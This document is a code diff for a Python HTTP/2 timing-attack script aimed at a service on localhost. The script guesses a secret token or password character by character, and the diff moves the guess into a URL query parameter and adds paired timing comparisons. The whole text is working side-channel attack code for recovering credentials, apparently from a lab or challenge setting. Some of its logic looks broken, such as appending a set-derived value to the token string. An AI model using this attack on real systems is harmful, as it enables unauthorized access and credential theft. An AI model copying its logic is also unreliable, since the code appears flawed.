@@ -11,9 +11,8 @@ async def create_auth_request(token: str) -> H2Request:
     """Create an H2Request with the specified Authorization token."""
     return H2Request(
         method="GET",
-        url="https://localhost:8888/auth/machine/login",
+        url=f"https://localhost:8888/?password={token}$",
         headers={
-            "Authorization": f"Bearer {token}",
             "User-Agent": "h2time/0.1"
         }
     )
@@ -32,21 +31,22 @@ async def perform_timing_attack(token_prefix: str, char_set: str = string.digits
     potential_chars = set()
     best_score = float('-inf')
     
-    for char in char_set:
-        test_token = token_prefix + char
-        r1 = await create_auth_request(test_token)
-        r2 = await create_auth_request(test_token + "x")  # Control request with invalid next char
+    for idx in range(len(char_set)):
+        char1 = char_set[idx]
+        char2 = char_set[(idx + 1) % len(char_set)]
+        r1 = await create_auth_request(token_prefix + char1)
+        r2 = await create_auth_request(token_prefix + char2)
         
-        async with H2Time(r1, r2, num_request_pairs=100, sequential=False, verify_cert=False) as h2t:
+        async with H2Time(r1, r2, num_request_pairs=10, send_order_pattern="2", sequential=False, verify_cert=False) as h2t:
             results = await h2t.run_attack()
             if results:
                 first_request_quicker = len([r for r in results if r[0] < 0])
                 second_request_quicker = len([r for r in results if r[0] > 0])
                 diff = abs(first_request_quicker - second_request_quicker)
-                logger.info(f"{char} diff: {diff}")
+                logger.info(f"{char1} {char2} diff: {diff}, t1 avg: {sum(int(r[0]) for r in results) / len(results)}")
                 
                 if diff:
-                    potential_chars.add(char)
+                    potential_chars.add(char1)
                     
     logger.info(f"Potential chars: {potential_chars}")               
     
@@ -61,6 +61,8 @@ async def find_token() -> str:
         if not next_char_set:
             break
         potential_chars.append(next_char_set)
+        if len(potential_chars) == 1:
+            token += potential_chars[0]
         print(f"Found token so far: {token}")
     
     if token:
